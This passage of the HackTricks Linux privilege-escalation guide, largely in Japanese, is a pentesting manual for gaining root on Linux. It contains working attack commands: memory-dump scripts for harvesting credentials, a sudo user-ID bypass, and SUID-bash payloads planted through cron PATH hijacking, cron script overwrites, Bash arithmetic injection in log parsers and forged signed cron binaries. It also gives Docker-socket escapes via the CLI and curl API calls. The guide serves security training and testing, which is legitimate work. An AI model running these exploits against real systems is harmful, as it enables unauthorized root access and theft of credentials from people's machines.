# Linux Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## システム情報

### OS 情報

実行中のOSに関する情報収集を始めましょう
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Path

もし**`PATH`変数内の任意のフォルダに書き込み権限がある**場合、いくつかのlibrariesやbinariesをハイジャックできる可能性があります:
```bash
echo $PATH
```
### 環境情報

環境変数に興味深い情報、パスワード、または API キーが含まれていますか？
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

kernelのバージョンを確認し、escalate privilegesに使えるexploitがないか調べる
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
ここでは良い vulnerable kernel list といくつかの既に **compiled exploits** を見つけることができます: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) and [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).\
その他のサイトでいくつかの **compiled exploits** を見つけることができます: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

そのウェブサイトからすべての vulnerable kernel versions を抽出するには次のようにします:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
kernel exploits を検索するのに役立つツールは:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (victim 上で実行、kernel 2.x の exploit のみをチェック)

常に **Googleでカーネルバージョンを検索** してください。カーネルバージョンが何らかの kernel exploit に記載されている場合があり、その場合はその exploit が有効であることを確認できます。

追加の kernel exploitation techniques:

{{#ref}}
../../binary-exploitation/linux-kernel-exploitation/adreno-a7xx-sds-rb-priv-bypass-gpu-smmu-kernel-rw.md
{{#endref}}
{{#ref}}
../../binary-exploitation/linux-kernel-exploitation/arm64-static-linear-map-kaslr-bypass.md
{{#endref}}

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Sudo バージョン

次に示す脆弱な sudo バージョンに基づいて:
```bash
searchsploit sudo
```
この grep を使って sudo のバージョンが脆弱かどうか確認できます。
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
### Sudo < 1.9.17p1

Sudo のバージョン 1.9.17p1 より前（**1.9.14 - 1.9.17 < 1.9.17p1**）では、ユーザーが制御するディレクトリから `/etc/nsswitch.conf` ファイルが読み込まれる場合に、sudo の `--chroot` オプションを利用して、権限のないローカルユーザが root に権限昇格できてしまいます。

Here is a [PoC](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot) to exploit that [vulnerability](https://nvd.nist.gov/vuln/detail/CVE-2025-32463). Before running the exploit, make sure that your `sudo` version is vulnerable and that it supports the `chroot` feature.

For more information, refer to the original [vulnerability advisory](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/)

#### sudo < v1.8.28

From @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg の署名検証に失敗しました

この脆弱性がどのように悪用され得るかの**例**については **smasher2 box of HTB** を確認してください。
```bash
dmesg 2>/dev/null | grep "signature"
```
### 追加のシステム列挙
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## 可能な防御を列挙する

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Docker Breakout

もし docker container 内にいる場合、そこから脱出を試みることができます:

{{#ref}}
docker-security/
{{#endref}}

## ドライブ

**何がマウントされていて何がされていないか**、どこに、なぜマウントされているかを確認してください。もし何かがアンマウントされていれば、それをマウントして機密情報がないか確認してみてください。
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## 便利なソフトウェア

有用なバイナリを列挙する
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
また、**コンパイラがインストールされているか**確認してください。これは、kernel exploit を使う必要がある場合に便利です。実行するマシン（または類似のマシン）でコンパイルすることが推奨されているためです。
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### インストールされた脆弱なソフトウェア

**インストールされているパッケージやサービスのバージョン**を確認してください。例えば、古い Nagios バージョンが存在し、それが escalating privileges に悪用される可能性があります…\
疑わしいインストール済みソフトウェアのバージョンは手動で確認することを推奨します。
```bash
dpkg -l #Debian
rpm -qa #Centos
```
SSHでマシンにアクセスできる場合、マシン内にインストールされている古く脆弱なソフトウェアを確認するために **openVAS** を使用することもできます。

> [!NOTE] > _これらのコマンドは大量の情報を表示し、その大部分は役に立たない可能性があるため、OpenVASのようなインストール済みソフトウェアのバージョンが既知の exploits に対して脆弱かどうかをチェックするアプリケーションを使用することを推奨します_

## プロセス

実行されている **どのプロセス** を確認し、どのプロセスが **本来より多くの権限を持っているか** をチェックしてください（例えば tomcat が root によって実行されているなど）
```bash
ps aux
ps -ef
top -n 1
```
常に[**electron/cef/chromium debuggers** running, you could abuse it to escalate privileges](electron-cef-chromium-debugger-abuse.md)が動作していないか確認してください。**Linpeas**はプロセスのコマンドライン内の`--inspect`パラメータをチェックしてそれらを検出します。\
また、プロセスのバイナリに対するprivilegesを確認してください。上書きできるものがあるかもしれません。

### Process monitoring

プロセスの監視には[**pspy**](https://github.com/DominicBreuker/pspy)のようなツールを使用できます。これは、脆弱なプロセスが頻繁に実行される場合や一定の条件が満たされたときに特定するのに非常に有用です。

### Process memory

サーバの一部サービスは**credentials in clear text inside the memory**を保存することがあります。\
通常、他のユーザに属するプロセスのメモリを読むには**root privileges**が必要になるため、これは通常、既にrootでさらに多くのcredentialsを見つけたいときに役立ちます。\
ただし、通常ユーザとして自分が所有するプロセスのメモリは読むことができることを忘れないでください。

> [!WARNING]
> Note that nowadays most machines **don't allow ptrace by default** which means that you cannot dump other processes that belong to your unprivileged user.
>
> The file _**/proc/sys/kernel/yama/ptrace_scope**_ controls the accessibility of ptrace:
>
> - **kernel.yama.ptrace_scope = 0**: 同じ uid を持つ限り、すべてのプロセスをデバッグできます。これは ptrace が従来どおり動作していた方法です。
> - **kernel.yama.ptrace_scope = 1**: 親プロセスのみがデバッグ可能です。
> - **kernel.yama.ptrace_scope = 2**: 管理者のみが ptrace を使用できます（CAP_SYS_PTRACE が必要）。
> - **kernel.yama.ptrace_scope = 3**: ptrace によるトレースは一切不可です。一度設定すると、ptrace を再度有効にするには再起動が必要です。

#### GDB

たとえば FTP サービスのメモリにアクセスできる場合、Heap を取得してその中の credentials を検索できます。
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDB スクリプト
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

特定のプロセスIDについて、**maps がそのプロセスの仮想アドレス空間内でメモリがどのようにマップされているかを示し**、また**各マップ領域の権限**も示します。  
この**mem** 擬似ファイルは**プロセスのメモリ自体を公開します**。**maps** ファイルから、どの**メモリ領域が読み取り可能か**とそのオフセットが分かります。  
この情報を使って、**mem ファイル内をシークして読み取り可能な領域をすべてダンプする**ことでファイルに書き出します。
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` はシステムの **物理** メモリにアクセスするためのものであり、仮想メモリにはアクセスしません。カーネルの仮想アドレス空間には /dev/kmem を使ってアクセスできます。\
通常、`/dev/mem` は **root** と **kmem** グループのみが読み取り可能です。
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump for linux

ProcDump は、Sysinternals スイートの Windows 向けの古典的な ProcDump ツールを Linux 向けに再実装したものです。入手は [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux) から。
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### ツール

プロセスメモリをダンプするには、次を使用できます:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_手動で root 要件を削除し、自分が所有するプロセスをダンプできます
- Script A.5 from [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (root が必要です)

### プロセスメモリからの認証情報

#### 手動の例

authenticator プロセスが実行されていることが分かった場合:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
プロセスをダンプし（プロセスのメモリをダンプするさまざまな方法は前のセクションを参照）、メモリ内の資格情報を検索できます：
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

このツール [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) は、**メモリから平文の認証情報を盗み出し**、いくつかの**既知のファイル**からも取得します。正常に動作させるにはroot権限が必要です。

| 機能                                               | プロセス名             |
| ------------------------------------------------- | --------------------- |
| GDM password (Kali Desktop, Debian Desktop)       | gdm-password          |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon  |
| LightDM (Ubuntu Desktop)                          | lightdm               |
| VSFTPd (Active FTP Connections)                   | vsftpd                |
| Apache2 (Active HTTP Basic Auth Sessions)         | apache2               |
| OpenSSH (Active SSH Sessions - Sudo Usage)        | sshd:                 |

#### 検索用正規表現/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## スケジュール/Cron ジョブ

### Crontab UI (alseambusher) が root で動作している場合 — webベースの scheduler privesc

web “Crontab UI” パネル (alseambusher/crontab-ui) が root として動作し、loopback のみでバインドされている場合でも、SSH のローカルポートフォワーディング経由で到達し、権限昇格のための特権ジョブを作成できます。

典型的な手順
- `ss -ntlp` / `curl -v localhost:8000` で loopback のみバインドされたポート（例: 127.0.0.1:8000）と Basic-Auth realm を発見する
- 運用関連のアーティファクトから認証情報を探す:
  - バックアップやスクリプト内（`zip -P <password>`）
  - systemd ユニットが `Environment="BASIC_AUTH_USER=..."`、`Environment="BASIC_AUTH_PWD=..."` を露出している
- トンネルしてログイン:
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- 高権限のジョブを作成して即時実行する (drops SUID shell):
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
- 使用してください:
```bash
/tmp/rootshell -p   # root shell
```
# ハードニング
- Crontab UIをrootで実行しない; 専用ユーザーと最小権限で制限する
- localhostにバインドし、さらにfirewall/VPNでアクセスを制限する; パスワードを再利用しない
- unit filesに秘密を埋め込まない; secret storesまたはroot-only EnvironmentFileを使用する
- オンデマンドのジョブ実行に対してaudit/loggingを有効にする



スケジュールされたjobに脆弱性がないか確認する。rootで実行されるスクリプトを悪用できるかもしれない（wildcard vuln? rootが使用するファイルを変更できるか? symlinksを使う? rootが使うディレクトリに特定のファイルを作成する?）。
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### Cron path

例えば、_/etc/crontab_ の中に PATH が見つかります: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_ユーザー "user" が /home/user に書き込み権限を持っている点に注意_)

この crontab 内で root ユーザーがパスを設定せずにコマンドやスクリプトを実行しようとする場合、例えば: _\* \* \* \* root overwrite.sh_\
すると、次の方法で root シェルを取得できます:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron がワイルドカードを含むスクリプトを使用している場合 (Wildcard Injection)

スクリプトが root によって実行され、コマンド内に “**\***” が含まれている場合、これを悪用して予期しないこと（privesc など）を引き起こす可能性があります。例:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**If the wildcard is preceded of a path like** _**/some/path/\***_ **, it's not vulnerable (even** _**./\***_ **is not).**

以下のページを読んで、より多くの wildcard exploitation tricks を参照してください:


{{#ref}}
wildcards-spare-tricks.md
{{#endref}}


### Bash arithmetic expansion injection in cron log parsers

Bash は ((...))、$((...))、および let 内での arithmetic evaluation の前に parameter expansion と command substitution を実行します。もし root cron/parser が信頼できないログフィールドを読み取り、それらを算術コンテキストに渡すと、攻撃者は cron 実行時に root として実行される command substitution $(...) を注入できます。

- Why it works: In Bash, expansions occur in this order: parameter/variable expansion, command substitution, arithmetic expansion, then word splitting and pathname expansion. したがって `$(/bin/bash -c 'id > /tmp/pwn')0` のような値はまず置換され（コマンドが実行され）、残った数値 `0` が算術に使われてスクリプトはエラーなく続行されます。

- Typical vulnerable pattern:
```bash
#!/bin/bash
# Example: parse a log and "sum" a count field coming from the log
while IFS=',' read -r ts user count rest; do
# count is untrusted if the log is attacker-controlled
(( total += count ))     # or: let "n=$count"
done < /var/www/app/log/application.log
```

- Exploitation: パースされるログに attacker-controlled なテキストを書き込み、数値に見えるフィールドに command substitution を含ませ末尾が数字になるようにします。算術が有効であるようにコマンドは stdout に出力しない（またはリダイレクトする）ようにしてください。
```bash
# Injected field value inside the log (e.g., via a crafted HTTP request that the app logs verbatim):
$(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
# When the root cron parser evaluates (( total += count )), your command runs as root.
```

### Cron script overwriting and symlink

もし root によって実行される **can modify a cron script** を変更できるなら、簡単に shell を取得できます:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
root によって実行されるスクリプトが **あなたがフルアクセスできるディレクトリ** を使用している場合、当該フォルダを削除して、あなたが制御するスクリプトを配置した別のフォルダへの **symlink フォルダを作成する** のが有効かもしれません。
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### 書き込み可能なペイロードを持つカスタム署名された cron バイナリ
Blueチームは、cronで実行されるバイナリを実行前にカスタムELFセクションをダンプしてベンダー文字列を grep し、root 権限で実行する前に「署名」することがある。そのバイナリが group-writable（例: `/opt/AV/periodic-checks/monitor` が `root:devs 770` 所有）で、signing material を leak できる場合、セクションを偽造して cron タスクをハイジャックできる:

1. `pspy` を使って検証フローをキャプチャする。例として Era では、root が `objcopy --dump-section .text_sig=text_sig_section.bin monitor` を実行し、その後 `grep -oP '(?<=UTF8STRING        :)Era Inc.' text_sig_section.bin` を実行してからファイルを実行していた。
2. leaked key/config（`signing.zip` から）を使って期待される証明書を再作成する:
```bash
openssl req -x509 -new -nodes -key key.pem -config x509.genkey -days 365 -out cert.pem
```
3. 悪意ある置換をビルドする（例: SUID な bash を置く、SSH キーを追加する）そして証明書を `.text_sig` に埋め込んで grep が通るようにする:
```bash
gcc -fPIC -pie monitor.c -o monitor
objcopy --add-section .text_sig=cert.pem monitor
objcopy --dump-section .text_sig=text_sig_section.bin monitor
strings text_sig_section.bin | grep 'Era Inc.'
```
4. 実行ビットを維持したままスケジュールされたバイナリを上書きする:
```bash
cp monitor /opt/AV/periodic-checks/monitor
chmod 770 /opt/AV/periodic-checks/monitor
```
5. 次の cron 実行を待つ。単純な signature check が成功すると、あなたの payload が root として実行される。

### 頻繁に実行される cron ジョブ

プロセスを監視して、1分、2分、5分ごとに実行されているプロセスを探せる。そこを利用して escalate privileges できるかもしれない。

例えば、**0.1秒ごとに1分間監視**し、**実行回数の少ない順にソート**して最も多く実行されたコマンドを除外するには、次のようにする:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**また使用できます** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (これは起動したすべてのプロセスを監視して一覧表示します).

### 見えない cron jobs

コメントの後に**キャリッジリターンを入れる**（改行文字なし）ことで cronjob を作成でき、cron job は動作します。例（キャリッジリターン文字に注意）:
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## サービス

### 書き込み可能な _.service_ ファイル

任意の `.service` ファイルに書き込めるか確認してください。書き込める場合は、それを **修正して** サービスが **起動**、**再起動**、または **停止** されたときにあなたの **backdoor** を **実行** するようにできます（マシンの再起動を待つ必要があるかもしれません）。\\
例えば、.service ファイル内にあなたの backdoor を作成し **`ExecStart=/tmp/script.sh`** と指定します。

### 書き込み可能なサービスバイナリ

サービスによって実行されるバイナリに対して **書き込み権限がある場合**、それらを backdoors に差し替えることで、サービスが再実行された際に backdoors が実行される点に注意してください。

### systemd PATH - Relative Paths

次のコマンドで **systemd** が使用する PATH を確認できます：
```bash
systemctl show-environment
```
パス内のいずれかのフォルダに**書き込み**できることが分かった場合、**権限昇格**が可能になることがあります。以下のような、サービス設定ファイルで**相対パスが使用されている**箇所を検索する必要があります:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
次に、書き込み可能な systemd PATH フォルダ内に、相対パスバイナリと同じ名前の**executable**を作成し、サービスが脆弱なアクション（**Start**, **Stop**, **Reload**）を実行するよう要求されると、あなたの**backdoor will be executed**（通常、非特権ユーザはサービスを開始/停止できませんが、`sudo -l` が使えるか確認してください）。

**サービスについて詳しくは `man systemd.service` を参照してください。**

## **タイマー**

**タイマー**は名前が `**.timer**` で終わる systemd の unit ファイルで、`**.service**` ファイルやイベントを制御します。**タイマー**はカレンダー時間イベントやモノトニック時間イベントをネイティブでサポートしており、非同期で実行できるため、cron の代替として使用できます。

すべてのタイマーは次のコマンドで列挙できます：
```bash
systemctl list-timers --all
```
### 書き込み可能なタイマー

タイマーを変更できるなら、systemd.unit の既存のエントリ (例: `.service` や `.target`) を実行させることができます。
```bash
Unit=backdoor.service
```
In the documentation you can read what the Unit is:

> タイマーが満了したときに有効化される unit を指定します。引数は unit 名で、そのサフィックスは ".timer" ではありません。指定しない場合、この値はタイマー unit と同じ名前（サフィックスを除く）を持つ service にデフォルトします（上記参照）。有効化される unit 名とタイマー unit の unit 名は、サフィックスを除いて同一にすることが推奨されます。

Therefore, to abuse this permission you would need to:

- `.service` などの systemd unit のうち、**書き込み可能なバイナリを実行している**ものを見つける
- **相対パスを実行している** systemd unit を見つけ、（その実行ファイルを偽装するために）**systemd PATH** に対して **書き込み権限** を持っていること

**Learn more about timers with `man systemd.timer`.**

### **タイマーを有効化する**

タイマーを有効化するには root 権限が必要で、次を実行します:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
注意: **timer** は `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer` に対するシンボリックリンクを作成することで**有効化**されます

## ソケット

Unix Domain Sockets (UDS) はクライアント-サーバモデルで同一マシンまたは別のマシン間の**プロセス間通信**を可能にします。これらはコンピュータ間通信のために標準の Unix ディスクリプタファイルを利用し、`.socket` ファイルを通じて設定されます。

ソケットは `.socket` ファイルを使用して設定できます。

**`man systemd.socket` でソケットについて詳しく学べます。** このファイル内では、いくつかの興味深いパラメータを設定できます:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: これらのオプションは異なりますが、要約するとソケットがどこで**リッスンするかを示します**（AF_UNIX ソケットファイルのパス、リッスンする IPv4/6 やポート番号など）。
- `Accept`: boolean 引数を取ります。**true** の場合、**各着信接続ごとにサービスインスタンスが生成され**、接続ソケットのみがそのインスタンスに渡されます。**false** の場合、すべての待ち受けソケット自体が**起動された service unit に渡され**、すべての接続に対して1つの service unit だけが生成されます。この値はデータグラムソケットや FIFO では無視され、単一の service unit が無条件にすべての着信トラフィックを処理します。**デフォルトは false**。パフォーマンス上の理由から、新しいデーモンは `Accept=no` に適した方法でのみ作成することが推奨されます。
- `ExecStartPre`, `ExecStartPost`: 1つ以上のコマンドラインを取り、それらは待ち受けるソケット/FIFO がそれぞれ**作成されバインドされる前**または**作成されバインドされた後に**実行されます。コマンドラインの最初のトークンは絶対パスのファイル名でなければならず、その後にプロセスの引数が続きます。
- `ExecStopPre`, `ExecStopPost`: 待ち受けるソケット/FIFO がそれぞれ**閉じられ削除される前**または**閉じられ削除された後に**実行される追加の**コマンド**です。
- `Service`: **incoming traffic** に対して**activate**する `service` unit 名を指定します。この設定は Accept=no のソケットでのみ許可されます。デフォルトではソケットと同じ名前の service（サフィックスを置き換えたもの）になります。ほとんどの場合、このオプションを使う必要はありません。

### 書き込み可能な .socket ファイル

もし**書き込み可能な** `.socket` ファイルを見つけたら、`[Socket]` セクションの先頭に `ExecStartPre=/home/kali/sys/backdoor` のような行を**追加**することができ、バックドアはソケットが作成される前に実行されます。したがって、**おそらくマシンの再起動を待つ必要があります。**\
_そのソケットファイルの設定がシステムで実際に使用されていなければ、バックドアは実行されない点に注意してください_

### 書き込み可能なソケット

もし**書き込み可能なソケット**（ここで言うのは設定ファイルの `.socket` ではなく Unix ソケットのことです）を特定したら、そのソケットと**通信することができ**、脆弱性を悪用できる可能性があります。

### Unix ソケットの列挙
```bash
netstat -a -p --unix
```
### 生の接続
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Exploitation example:**


{{#ref}}
socket-command-injection.md
{{#endref}}

### HTTP sockets

注意: いくつかの **sockets listening for HTTP** requests が存在する場合があります（_.socket files のことではなく、unix sockets として動作するファイルのことを指します_）。次のコマンドで確認できます:
```bash
curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
```
ソケットが **responds with an HTTP** request の場合、それと **communicate** でき、場合によっては **exploit some vulnerability** することもあります。

### 書き込み可能な Docker Socket

The Docker socket, often found at `/var/run/docker.sock`, is a critical file that should be secured. デフォルトでは、`root` ユーザーおよび `docker` グループのメンバーによって書き込み可能です。 このソケットへの書き込み権限を持つと、privilege escalation に繋がる可能性があります。 以下に、その実行方法の内訳と、Docker CLI が利用できない場合の代替手段を示します。

#### **Privilege Escalation with Docker CLI**

もし Docker socket への書き込み権がある場合、次のコマンドを使用して escalate privileges できます:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
これらのコマンドにより、ホストのファイルシステムに対してrootレベルのアクセスを持つコンテナを実行できます。

#### **Docker APIを直接使用する**

Docker CLIが利用できない場合でも、DockerソケットはDocker APIと`curl`コマンドを使って操作できます。

1.  **List Docker Images:** 利用可能なイメージの一覧を取得します。

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2.  **Create a Container:** ホストのルートディレクトリをマウントするコンテナを作成するリクエストを送信します。

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

新しく作成したコンテナを起動する:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **Attach to the Container:** `socat`を使ってコンテナに接続を確立し、その中でコマンドを実行できるようにします。

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

`socat`接続を設定した後、ホストのファイルシステムに対するrootレベルのアクセス権でコンテナ内で直接コマンドを実行できます。

### その他

docker socketに対して書き込み権限を持っている（**inside the group `docker`**）場合は、[**more ways to escalate privileges**](interesting-groups-linux-pe/index.html#docker-group)があります。もし[**docker API is listening in a port** you can also be able to compromise it](../../network-services-pentesting/2375-pentesting-docker.md#compromising)なら、それを悪用できる可能性もあります。

dockerからの脱出やそれを悪用してescalate privilegesする他の方法の詳細は、次を確認してください：


{{#ref}}
docker-security/
{{#endref}}

## Containerd (ctr) privilege escalation

If you find that you can use the **`ctr`** command read the following page as **you may be able to abuse it to escalate privileges**:


{{#ref}}
containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** privilege escalation

If you find that you can use the **`runc`** command read the following page as **you may be able to abuse it to escalate privileges**:


{{#ref}}
runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Busは高度なインター・プロセス・コミュニケーション（IPC）システムであり、アプリケーションが効率的に相互作用しデータを共有できるようにします。現代のLinuxシステムを念頭に設計されており、様々な形態のアプリケーション間通信のための堅牢なフレームワークを提供します。

このシステムは多用途で、プロセス間のデータ交換を強化する基本的なIPCをサポートし、**enhanced UNIX domain sockets**を連想させます。さらに、イベントやシグナルのブロードキャストを支援し、システムコンポーネント間の統合を容易にします。たとえば、Bluetoothデーモンからの着信通知のシグナルが音楽プレーヤーをミュートするよう促す、といったユーザー体験の向上が可能です。加えて、D-Busはリモートオブジェクトシステムをサポートしており、アプリケーション間のサービス要求やメソッド呼び出しを簡素化し、従来は複雑だった処理を効率化します。

